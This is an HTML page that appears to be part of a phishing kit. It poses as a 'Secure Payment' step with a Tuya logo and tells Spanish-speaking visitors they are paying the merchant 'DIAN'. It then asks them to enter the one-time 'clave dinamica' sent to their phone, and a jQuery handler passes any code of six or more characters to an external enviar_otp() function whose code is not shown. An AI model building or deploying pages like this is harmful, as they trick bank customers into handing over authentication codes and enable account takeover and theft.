
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">



    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script>  		


    <title>Secure Payment</title>
</head>
<body style="">
    

<div class="details" style="">
	<center><img src="/img/logoTuya.png" alt="" srcset="" width="50%"><center><br>
<br><br><br><div class="" style="margin-top:55px">
    <a>Esta a punto de realizar un pago en el comercio <b>DIAN</b> para continuar ingrese la clave dinamica que hemos enviado al numero asociado con su cuenta</a>

   <center> <br><input type="tel" name="" id="txtOTP" placeholder="Clave dinamica" style="width:90%; height: 40px; margin-top:20px;">
    <input type="submit" value="Continuar" id="btnOTP" style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px; margin-top:10px;"></center>

</div>

<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val().length > 5) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>



</body>
</html>
